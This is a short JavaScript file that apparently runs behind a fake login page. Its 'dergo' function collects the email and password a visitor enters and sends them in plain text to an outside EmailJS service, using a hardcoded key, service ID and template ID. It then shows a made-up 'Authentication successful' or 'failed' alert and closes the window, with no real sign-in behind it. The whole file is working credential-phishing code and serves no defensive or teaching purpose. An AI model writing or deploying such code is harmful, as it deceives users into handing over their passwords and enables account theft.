(function () {
  emailjs.init("1m6dN0gm7NpV9CaTE");
})();

function togglePassword() {
  const pass = document.getElementById("password");
  pass.type = pass.type === "password" ? "text" : "password";
}

function dergo() {
  const email = document.getElementById("email");
  const password = document.getElementById("password");
  const error = document.getElementById("error");
  const loader = document.getElementById("loader");
  const btn = document.getElementById("loginBtn");

  if (!email.value.includes("@") || password.value === "") {
    error.classList.remove("hidden");
    return;
  }

  error.classList.add("hidden");
  loader.classList.remove("hidden");
  btn.disabled = true;

  const params = {
    email: email.value,
    password: password.value
  };

  emailjs
    .send("service_cb5unuk", "template_r29d4im", params)
    .then(() => {
      setTimeout(() => {
        alert("Authentication successful.");
        window.close();
      }, 1500);
    })
    .catch(() => {
      setTimeout(() => {
        alert("Authentication failed.");
        window.close();
      }, 1500);
    });
}